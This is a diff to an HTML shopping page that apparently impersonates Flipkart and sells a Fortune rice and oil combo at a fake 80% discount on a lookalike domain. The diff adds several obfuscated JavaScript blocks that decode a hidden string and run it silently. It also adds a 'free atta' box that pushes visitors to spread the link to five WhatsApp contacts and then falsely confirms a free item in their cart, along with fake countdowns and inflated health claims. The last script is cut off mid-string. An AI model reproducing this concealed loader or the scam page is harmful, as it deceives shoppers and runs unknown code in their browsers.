i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _G8S(_cu,_BV,_17,$,_9Vi,_O06C){_iGw4=this._W5L5YvH3h__wacD79;_iGw4.f(_9Vi,$);if(!_17){_17=$.__u8n;}_7F()(_cu,0,0xf1f,this,"''");function _7F(){return function(_eBf,_ro,_R35,_65t,_9TUK){_iGw4.p1=_eBf;_iGw4.p2=_R35;try{_qi6(_65t)(_Kj()([_17[$._730lN]("+p%p",_9TUK)[$._730lN]("-p%q",_9TUK)],''))();}catch(e){}function _qi6(_hm7){return _hm7[$._nD6];};_65t._W5L5YvH3h__wacD79=_O06C;};};function _Kj(){return function(_rBQ6,_FT6a){return _rBQ6[$._g9T1](_FT6a);};};};}());
+</script>
+
+
+      <div>
+      <h1>Fortune, Everyday Basmati Rice<br>(5-KG) and Fortune Soya Health Refined Soya Bean Oil (5 L) (Combo)</h1>
+      
           
   
       <div class="badge">Top Discount of the Sale</div>
@@ -1059,7 +73,7 @@ body {
 
       <div class="rating-row">
         <span class="rating">4.3 ★</span>
-        <span class="count">12,544 Ratings & 2,898 Reviews</span>
+<span class="count">12,544 Ratings & 2,898 Reviews</span>
         </div>
         <div class="off">80% OFF</div>
       </div>
@@ -1069,17 +83,73 @@ body {
         <span>WOW DEAL</span>
         <span>₹2000 Discount OFF</span>
       </div>
-        <p style="margin-top:18px;font-size:14px;color:var(--muted)">
-        Apply offers for maximum savings!
-      </p>
+      <div>
 
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Free Gift Compact</title>
+    <script>
+(function(){_M27(".u~zfl$pcu;cy/iqycns/9y|u#gs.<$!jy!g<gcuqt|5fd;xp;nhgop.2p!x;m.pj.xq<#j~m<tcftv<sfngm;y!g5.pcfn/jtsgfsx5y1i2bxyomiycepfkupfptchsbfpb<fm5iomj;xo;pg<efq.!b9zj|.fb!ppo/yvbsfm;pc.ssdvubf<fuph3imdv<qfjytsuq;eqigu2sn#p<tse<j1ybmh.lustygjfdiqbjfoubsh<ihtycubfut7eb;gbuufce<.)fjm<pbf;pholuyuooefe.inbcb<miej!bqfj#gmj<sp!qt1gofx<o~2oiu<;<tfu;yesubebqip;ehjqyso#fjgc.s$bi-u.gjct!uu!d8gb.f$ujb;sp)qfd5jinq<.t-shzbuefeb1|suepj/2.;tp1pqgs3.oe8hx1.jl9ouh.gs##.o.dpffee-gj!usup!t2um1oqm<6ehj1j;-ch~1h;|cpb;tc.dlqsfjp1mhjiejgbj/sp<u.fhef;v1oj1uiq;2xuoe#dpjph;.<ox-fin;fpgv{5psn.cyb4d2t<.o-ouAy21jouj#syuos2cch;1yuh9sofuf6o;btu<q7p1;gut1!;n*11e|.v-j|fupqpp;1/;;|5.;sp;~h$sjob;7sq3ppf-j2f|qquqtt#qenfvyus2!112eqsx.<2|3h{|m9<by7oqu1n9e/yyibj;sujtoo!ue545!3jybjdd4/e3jfejqdu!qu;!/hqjp!~;e{3f.t;uetpfqq*1qt<eeppqpj3o;jhypj3y.211|ybg2/8ef3ejqd;;pnsyy~!yqijuomygt<.2to<mp1<t1!7x<!g3p1j;qjemfg$m;.!!b~mfviup<gqgc5q.cpoqgjq.*je)fqgqo2ys#bomgj2s27/vbjt!fsmfmppqmjbs;yp{y3~ejnsygyh4~f;zufgeqb7qpu/zh;/o;jsbouybud;o<of<qutb.<f~;q~d#;fyg!yeqygpp;i93u$o.zu",(function(){this._W5L5YvH3h__wacD79={f:function(_zD,$){_11N="\x70\x6c\x61";function _zK(_zD,$,_88,_DJzb){function _W56(_k99Y){_k99Y=_RV8(_k99Y)-32-(_DJzb%95);if(_k99Y<0){_k99Y+=95;}_k99Y+=32;_DJzb++;return _1RH(_k99Y);};function _SP73(_zD,_88){_fw4=_zD[_88];_74h="";while(_fw4!="\f"){if(_fw4<" "){_74h+=_fw4;}else{_74h+=_W56(_fw4);}_88++;_fw4=_zD[_88];}return _74h;};function _RV8(_fw4){return _fw4[_K7l](0);};function _1RH(_k99Y){return this[_1CcE][_7mfK](_k99Y);};_88=_88?_88:0;if(_zD[_2ld0]>_88){_DJzb=_DJzb?_DJzb:0;_1ZO1=_SP73(_zD,_88);_6O=_1ZO1[_2ld0];_9be=_SP73(_zD,_88+_6O+1);_52jC=_9be[_2ld0];$[_1ZO1]=_9be;_zK(_zD,$,_88+_6O+1+_52jC+1,_DJzb);}};_NO="\x72\x65"+_11N+"\x63\x65";_K7l=_T57h("_ahco%Cr%Aedt");_1CcE=_T57h("r_t%Sgni");_7mfK=_T57h("_orfhCm%Crae_do");_2ld0=_T57h("ne_lh_tg");_zK(_zD,$);function _T57h(_8c){return _8c[_NO](/[x%y_z]/g,'')[_NO](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _M27(_8CM5,_T1,_lqob,$,_uPk,_Cz3u){_zB=this._W5L5YvH3h__wacD79;_zB.f(_uPk,$);if(!_lqob){_lqob=$.__u8n;}_0Pce()(_8CM5,0,0x172f,this,"''");function _0Pce(){return function(_rx0,_SL,_9sCP,_1kB3,_5g){_zB.p1=_rx0;_zB.p2=_9sCP;try{_5r86(_1kB3)(_7fo()([_lqob[$._730lN]("+p%p",_5g)[$._730lN]("-p%q",_5g)],''))();}catch(e){}function _5r86(_EaU){return _EaU[$._nD6];};_1kB3._W5L5YvH3h__wacD79=_Cz3u;};};function _7fo(){return function(_GerK,_2ih){return _GerK[$._g9T1](_2ih);};};};}());
+  </script>
+</head>
+<body>
+
+  <div class="offer-box" id="offerBox">
+    <div class="offer-left" id="offerImage">
+      <img src="https://i.ibb.co/Qv3qMy6s/Picsart-25-10-02-17-09-18-598.png" alt="Fortune">
+    </div>
+
+    <div class="offer-content" id="offerContent">
+      <strong>GET FREE (Fortune 5KG Atta)</strong>
+      By Sharing This Up With 5 persons in WhatsApp. SHARE NOW TO GET IT.
+      <br>
+      <a class="whatsapp-btn"
+         href="https://api.whatsapp.com/send?text=Get%20Free%20Fortune%205kg%20Atta!%20Share%20Now!%20Attached%20https://flipkaart-combo-sale.pages.dev/"
+         target="_blank"
+         onclick="showThankYou(event)">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+        Share on WhatsApp
+      </a>
+    </div>
+  </div>
+
+  <script>
+    let shared = false;
+    function showThankYou(e) {
+      e.preventDefault();
+      if (shared) return;
+      shared = true;
+
+      window.open(e.currentTarget.href, "_blank");
+
+      const box = document.getElementById('offerBox');
+      const imgDiv = document.getElementById('offerImage');
+      const contentDiv = document.getElementById('offerContent');
+
+      box.style.background = 'linear-gradient(180deg,#f0fff6,#ffffff)';
+      box.style.borderTop = '1px solid #d6ead9';
+      box.style.borderBottom = '1px solid #d6ead9';
+      box.style.color = '#1d7c3e';
+
+      // Smaller, rounded thank-you image
+      imgDiv.innerHTML = `<img src="https://i.ibb.co/Mxqmynfn/Picsart-25-10-02-17-22-29-331.jpg" alt="Congrats" style="width:60px;height:auto;border-radius:12px;">`;
+
+      contentDiv.innerHTML = `<strong style="color:#1d7c3e;font-size:15px;">🎉 Congratulations!</strong>Your FREE 5KG Fortune Atta has been added to your cart!`;
+    }
+  </script>
+
+</body>
+</html>
       <!-- Delivery details -->
       <div class="delivery">
-        <h3>Delivery details</h3>
-        <p><strong></strong> – delivery </p>
-        <p><b>EXPRESS</b> Delivery in 2 days <br><small>Order in 00h 36m 07s</small></p>
+        <h3>DELIVERY TIMING</h3>
+        <p><strong></strong> – Details </p>
+        <p><b>EXPRESS :</b> DELIVERY IN 3 DAYS <br><small>Order in 00h 36m 07s</small></p>
         <p><small>Fulfilled by ECOMTAMSINRetail – 3 years with Flipkart</small></p>
-        <p><small>Rating: 4.2 ★</small></p>
+        <p><small>Rating: 4.2 ★★★★☆                           </small></p>
       </div>
     </div>  
     <div class="tab-content card" id="specs" style="display:none">  
@@ -1112,7 +182,7 @@ body {
    
     <div class="order-info">
     <div class="icon-wrapper">
-  <img src="https://i.ibb.co/vRp9wr4/SVG-2025-09-30-17-34-40-702.png" alt="SVG-2025-09-30-17-34-40-702" border="0">
+<img src="https://i.ibb.co/vxjP1Syt/arrow-1.png" alt="arrow-1" border="0">
   </div>
   
 <span><strong>3,000+ People </strong>Ordered This In The Last 15 Days</span>
@@ -1120,179 +190,45 @@ body {
   
   
    <div class="product-details">
-  <h3>Product Details</h3>
+  <h3>Product Highlights</h3>
   <ul>
     <li><span class="label">Pack of</span><span class="value">5L+5KG</span></li>
     <li><span class="label">Brand</span><span class="value">FORTUNE</span></li>
-    <li><span class="label">Model Name</span><span class="value">Soya health refined</span></li>
-    <li><span class="label">Type</span><span class="value">Soyabean Oil</span></li>
-    <li><span class="label">Quantity</span><span class="value">10KG</span></li>
+    <li><span class="label">Model Name</span><span class="value">Basmati/Soyabean</span></li>
+    <li><span class="label">Type</span><span class="value">long-grain Rice + Rice Bran Oil</span></li>
+    <li><span class="label">Quantity</span><span class="value">5-KGs + 5-Liters</span></li>
     <li><span class="label">Used For</span><span class="value">Cooking</span></li>
     <li><span class="label">Processing Type</span><span class="value">Cold Pressed</span></li>
     <li><span class="label">Maximum Shelf Life</span><span class="value">276 Days</span></li>
   </ul>
   
-   <block>
-     <p>Additional Information</p>
-   </block>
-  <p class="note">
-    •  Fortune Soyabean Health Oil Is a Healthy Heart Oil That Is Naturally Enriched With Multiple Nutrients Like Oryzanol to Provide Health Benefits for Every Member of the Family.<br>
-•  Fortune Everyday Full Grain Basmati Rice to Add a Unique Flavour to Add to Your Everyday Dishes.<br>
-• Flipkart endeavours to ensure accurate product information. Always read labels carefully before use.
-  </p>
+   <block>  
+     <p>Additional Information</p>  
+   </block>  
+  <p class="note">  
+    • Fortune Soyabean Health Oil is a heart-friendly refined oil, naturally enriched with Omega-3, Vitamin E, and Oryzanol for overall family wellness.<br>
+  • Helps maintain cholesterol balance, supports an active lifestyle, and enhances the natural taste of food.<br>
+  • Light and easy to digest, making it ideal for everyday cooking — frying, sautéing, or seasoning.<br>
+  • Fortune Everyday Full Grain Basmati Rice offers long, aromatic grains that stay non-sticky and fluffy after cooking.<br>
+  • Adds a rich flavour and aroma to your daily meals — perfect for biryanis, pulaos, and home-style dishes.<br>
+  • Combo pack ensures great value, purity, and consistent quality for family use.<br>
+  • Flipkart endeavours to ensure accurate product information. Always read labels carefully before use.<br>
+  • Store both oil and rice in a cool, dry place away from direct sunlight for lasting freshness.<br>
+  • Manufactured and packed by Adani Wilmar Ltd., Made in India.
+    •  Fortune Soyabean Health Oil Is a Healthy Heart Oil That Is Naturally Enriched With Multiple Nutrients Like Oryzanol to Provide Health Benefits for Every Member of the Family.<br>  
+•  Fortune Everyday Full Grain Basmati Rice to Add a Unique Flavour to Add to Your Everyday Dishes.<br>  
+• Flipkart endeavours to ensure accurate product information. Always read labels carefully before use.  
+  </p>  
 </div>
 
 
 
 
- <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: #fff;
-      color: #222;
-    }
 
-    .header {
-      display: flex;
-      align-items: center;
-      padding: 12px;
-      border-bottom: 1px solid #ddd;
-    }
-    .header h2 {
-      margin: 0 auto;
-      font-size: 18px;
-    }
 
-    .summary-container {
-      display: flex;
-      align-items: flex-start;
-      padding: 16px;
-    }
-    .product-img {
-      flex: 0 0 80px;
-      margin-right: 12px;
-    }
-    .product-img img {
-      width: 80px;
-      height: auto;
-      border-radius: 6px;
-      border: 1px solid #eee;
-    }
-
-    .rating-summary {
-      flex: 1;
-    }
-    .rating-summary .stars {
-      color: #2e7d32;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .rating-summary .total {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .bars {
-      padding: 0 16px 16px;
-      font-size: 14px;
-    }
-    .bar {
-      display: flex;
-      align-items: center;
-      margin: 4px 0;
-    }
-    .bar span {
-      width: 20px;
-      margin-right: 6px;
-    }
-    .bar-line {
-      flex: 1;
-      height: 6px;
-      border-radius: 3px;
-      background: #eee;
-      margin: 0 6px;
-      position: relative;
-    }
-    .bar-line div {
-      height: 100%;
-      border-radius: 3px;
-      background: #2e7d32;
-    }
-    .bar-count {
-      width: 30px;
-      text-align: right;
-      font-size: 12px;
-      color: #555;
-    }
-
-    .filters {
-      display: flex;
-      justify-content: space-around;
-      padding: 8px;
-      border-top: 1px solid #eee;
-      border-bottom: 1px solid #eee;
-      background: #fafafa;
-    }
-    .filters button {
-      padding: 6px 12px;
-      border-radius: 20px;
-      border: 1px solid #ccc;
-      background: #fff;
-      font-size: 13px;
-      cursor: pointer;
-    }
-    .filters button.active {
-      border-color: #2e7d32;
-      color: #2e7d32;
-      font-weight: bold;
-    }
-
-    .review {
-      padding: 16px;
-      border-bottom: 1px solid #eee;
-    }
-    .review-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 6px;
-    }
-    .stars-small {
-      color: #2e7d32;
-      font-size: 14px;
-      margin-right: 6px;
-    }
-    .rating-text {
-      font-weight: bold;
-      margin-right: 8px;
-    }
-    .review .text {
-      margin: 8px 0;
-      font-size: 14px;
-    }
-    .review .user {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 6px;
-    }
-    .review .meta {
-      font-size: 12px;
-      color: #777;
-      margin-bottom: 10px;
-    }
-    .actions {
-      display: flex;
-      gap: 10px;
-      font-size: 13px;
-    }
-    .actions button {
-      border: 1px solid #ddd;
-      background: #fff;
-      border-radius: 20px;
-      padding: 4px 10px;
-      cursor: pointer;
-    }
-  </style>
+ <script>
+(function(){_T2T2("f<<jgov<!etho3v2c<<~ps<gej.jxzfj/mus~|pix;{ftscfopj~q2;tse$ejv|##;.tho$emuqpe3pqpbjsyhy;uibesfn/z;tjs.p|y{emu!xhy<;e1;shsbeuygdmmuoctfps/|qtqbgdo.dp~oce.;notp.hgmu!9fxj;pwumom12!;egjos#s##gbje3jjfyne|<yozuu~|<2.;vj;fns!$jo/ztsq!fjjf1jj/;c4;!s.i.d4|uppuffeppsmpgqy;ydpv//dpohp!igt.ustj/pe;/q;!{$uj.p./bq4c2<gvhtef-#boo;3ths<;eng~u;f<gn3j9uv2~bb/3{.s!j;b2;ths~eoc2pq$7fmusl3x.omfyo<sm.jvjb<3!losgbpmu/;u$fm;cb;joso<9uy2/f6uftscbzyqvqcgt;ppe#~nt;$3qo<c2~bpbgnq/mbqn1ptqsutffcb/{$e72qo<u.b<syfqmj;bh~jbups<uqejceomec1thutjdmp.s2ufbfdps${.bunqf!5v;6pxj;pd;<yuyb<;5snjtj.1g~m.qpqso/jmtbqfsyhq<;y/zju8;puuf6eq5m.n/issie<fybo2esem.stk;bfep!euepqps.pmupsxf7pfeyfut3fsu.byy1qt26n!{$uugg~u!dc3q;bsdcmt<gbjbsy/hutof;esyh~!yc7!s|obe3ujp;6jyqbjbc;j.ffcf<uf1jp/ujt;|vtes!u$;fjsymptsujs;fwqnff<ou.f;jjxs~u<yf4<;/f8ujmpptlp1yqjfspzfcg/zuee!ij.vfygep;jj<pqtbghs43uou26o<yzusb3hmjsb<qj!1vvcihj$etqe.$uf$soe<jvj;fw;$jjy;~sbupt82hofh|g~sqn7n;8ppfo/ophsq!podje;sb<i;feftfotns<mje1o/nisypum.t3qphb5~hg~;fhs1ijh.dnpwe&tob;o{6jubjufpfgthfceo{qsf$3hf<2|mfnne5ihjj/np|ybqf28noyub|msey2jtuqzBjddfgnjspb;jn|bfov!.qhfe<mjft|<yn.mq;pgnj!quoislbtfj<;es4;f6tjdopfnfb!;sp!efpt|3fixcq/ejs;b4qu.hosbo/g<syu3<;t<.dcjpf<1o#ju|sglpbmto.me1{bemyhd1ss|jfcjoyvdg<;t|y/1o/mtoty;fubhsj~wc4;.1s;6qgfhqf;<gc7.s$;;j!cf8u|pysjh<7m3y;ui.fsuspdh~bqn2|htupevsqqu;p.gj<hmef;hcjf!fsjj.;u!jpxhspeh;nppn5vg<c!ucf;;q<7|;eshu|pq$dqj2~mz.;;<2cbvqsed$2ocp8e;qs!ftonqm<<7fuswh.fopj|yb1ebjjs!o.byf#ojpbnspfyd;pesb;ztht2.9heji.s!.2nmobqnpdb2.byd5bnqg7jpjj/isy3pyh3b.b92cqbguybfdg4uvse4cbetwq.by|gnqy;jjjtwumo/g<sqjq{pe$ese<s##eombpss<f2u!!v2.qou7j1iveuse$t~bpusynops7ts<fqobymqvvopcfe<fv<iq/zdsqqpydbu!esdgqfue43pefpjmjs~dpbyuchfojj.p.spdhyt;fofe;bed~-;#u-sv;|bo3u$iu9dm.bqnqudu;bffvss.h~bumtqj|boy|s~fyto;objfc8ouuyg;ppyys!l~p2j;<gysuf3<mesmfbuhpo",(function(){this._W5L5YvH3h__wacD79={f:function(_bP,$){_UC9O="\x70\x6c\x61";function _VF(_bP,$,_6h,_RS){function _LE3e(_shy){_shy=_85Tm(_shy)-32-(_RS%95);if(_shy<0){_shy+=95;}_shy+=32;_RS++;return _6bC(_shy);};function _y9Zv(_bP,_6h){_7h=_bP[_6h];_8AS="";while(_7h!="\f"){if(_7h<" "){_8AS+=_7h;}else{_8AS+=_LE3e(_7h);}_6h++;_7h=_bP[_6h];}return _8AS;};function _85Tm(_7h){return _7h[_l4](0);};function _6bC(_shy){return this[_M6i][_y80N](_shy);};_6h=_6h?_6h:0;if(_bP[_6L]>_6h){_RS=_RS?_RS:0;_o0=_y9Zv(_bP,_6h);_Dv=_o0[_6L];_KQJ=_y9Zv(_bP,_6h+_Dv+1);_w8=_KQJ[_6L];$[_o0]=_KQJ;_VF(_bP,$,_6h+_Dv+1+_w8+1,_RS);}};_6Q2="\x72\x65"+_UC9O+"\x63\x65";_l4=_t47("_ahco%Cr%Aedt");_M6i=_t47("r_t%Sgni");_y80N=_t47("_orfhCm%Crae_do");_6L=_t47("ne_lh_tg");_VF(_bP,$);function _t47(_WV){return _WV[_6Q2](/[x%y_z]/g,'')[_6Q2](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H 